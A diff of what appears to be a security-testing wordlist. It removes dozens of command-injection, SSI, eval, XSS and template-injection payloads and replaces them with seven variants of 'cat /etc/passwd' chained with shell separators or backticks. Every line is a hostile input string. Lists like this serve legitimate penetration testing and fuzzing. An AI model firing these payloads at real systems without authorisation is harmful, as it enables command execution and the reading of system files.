@@ -1,38 +1,7 @@
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-;id;
-;/usr/bin/id\n
-a|id
-;system('id')
-`ping 127.0.0.1`
-cat /etc/hosts
-$(`cat /etc/passwd`)
-`
-|| 
-| 
-ls
-; 
-'
-'"
-"
-"'
-& 
-dir
-;echo%20'<script>alert(1)</script>'
-eval('ls')
-eval('pwd')
-eval('pwd');
-eval('sleep 5')
-ifconfig
-&& net view
-net view
-;phpinfo();//
-\r\n
-route
-| sleep 1
-{{ get_user_file("C:\boot.ini") }}
-{{ get_user_file("/etc/hosts") }}
-{{4+4}}
-{{4+8}}
-{{person.secret}}
-{{person.name}}
-{1} + {1}
+cat /etc/passwd
+;cat /etc/passwd
+;;cat /etc/passwd
+;cat /etc/passwd;
+&cat /etc/passwd
+&&cat /etc/passwd
+`cat /etc/passwd`
